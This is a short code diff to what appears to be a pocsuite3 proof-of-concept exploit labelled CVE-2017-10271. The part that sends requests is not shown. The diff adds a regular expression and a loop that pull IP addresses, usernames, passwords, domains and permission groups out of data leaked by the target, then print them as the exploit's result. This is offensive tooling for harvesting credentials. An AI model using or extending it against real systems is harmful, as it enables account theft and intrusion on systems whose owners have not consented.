@@ -1,4 +1,5 @@
 from pocsuite3.api import Output, POCBase, requests, register_poc
+import re
 
 class DemoPOC(POCBase):
 	vulID = 'CVE-2017-10271'  # ssvid
@@ -67,9 +68,17 @@ class DemoPOC(POCBase):
 						pass
 					else:
 						data += "."
+
+			find_data = r"(?:\.\.\.)([0-9\.]+)\.\.\.([a-zA-Z0-9\-_]+)\.\.\.([a-zA-Z0-9\-_]+)\.\.\.([a-zA-Z0-9\-\_]+)\.\.([a-zA-Z0-9\-_]+)\.\.\.([a-zA-Z0-9\-_]+)"
+			ret = "\n"
+			for dIP, dUser, dPassword, dDomain, dPermission, dGroup in re.findall(find_data, data):
+				if dUser not in ret:
+					ret += "[IP: %s] [User: %s] [Pwd: %s] [Domain: %s] [Perm: %s] [Group: %s]\n" %(
+						dIP, dUser, dPassword, dDomain, dPermission, dGroup
+					)
 			result = {}
 			result['Leak'] = {}
-			result['Leak']['DataLeak'] = data
+			result['Leak']['DataLeak'] = ret
 			output = Output(self)
 			output.success(result)
 			return output
